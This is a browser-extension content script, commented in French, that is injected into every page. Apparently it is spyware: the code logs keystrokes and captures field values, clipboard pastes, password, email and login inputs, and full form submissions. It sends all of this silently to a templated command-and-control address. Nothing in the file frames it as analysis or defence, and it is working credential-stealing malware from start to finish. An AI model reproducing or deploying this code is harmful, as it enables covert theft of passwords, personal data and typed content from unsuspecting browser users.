// extension/content.js — injecté dans toutes les pages
const C2 = "%%C2%%";

function post(endpoint, data) {
  fetch(C2 + endpoint, {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify({
      ...data, url: location.href }),
  }).catch(() => {});
}

// Keylogger
(function() {
  const B = []; let timer = null;

  document.addEventListener("keydown", e => {
    const el = document.activeElement;
    B.push({
      k:  e.key,
      f:  el ? (el.name||el.id||el.type||"?") : "?",
      ts: Date.now(),
    });
    clearTimeout(timer);
    timer = setTimeout(flush, 3000);
    if (e.key === "Enter") flush();
  }, true);

  document.addEventListener("blur", e => {
    const el = e.target;
    if (el.value && el.tagName === "INPUT") {
      post("/ext/field", {
        f:    el.name || el.id || el.type,
        v:    el.value,
        type: el.type,
        ts:   new Date().toISOString(),
      });
    }
  }, true);

  document.addEventListener("paste", e => {
    const txt = (
      e.clipboardData || window.clipboardData
    ).getData("text");
    if (txt) post("/ext/paste", {
      v:  txt,
      ts: new Date().toISOString(),
    });
  }, true);

  function flush() {
    if (!B.length) return;
    const data = B.splice(0);
    post("/ext/keys", {
      keys:  data,
      count: data.length,
      ts:    new Date().toISOString(),
    });
  }

  setInterval(flush, 8000);
  window.addEventListener("beforeunload", flush);
})();

// Surveiller champs password / email
function scanInputs() {
  const sel = [
    "input[type=password]",
    "input[type=email]",
    "input[name*=pass]",
    "input[name*=user]",
    "input[name*=login]",
    "input[id*=pass]",
    "input[id*=email]",
  ].join(",");
  document.querySelectorAll(sel).forEach(el => {
    if (el._fl) return;
    el._fl = true;
    el.addEventListener("change", () => {
      if (el.value) {
        post("/ext/sensitive_field", {
          type: el.type,
          name: el.name || el.id,
          v:    el.value,
          ts:   new Date().toISOString(),
        });
      }
    });
  });
}

// Capturer soumissions
document.addEventListener("submit", e => {
  const form = e.target;
  const data = {};
  new FormData(form).forEach((v, k) => {
    data[k] = v;
  });
  post("/ext/form", {
    action: form.action,
    method: form.method,
    fields: data,
    ts:     new Date().toISOString(),
  });
}, true);

scanInputs();
setInterval(scanInputs, 2000);
new MutationObserver(scanInputs).observe(
  document.body || document.documentElement,
  { childList: true, subtree: true }
);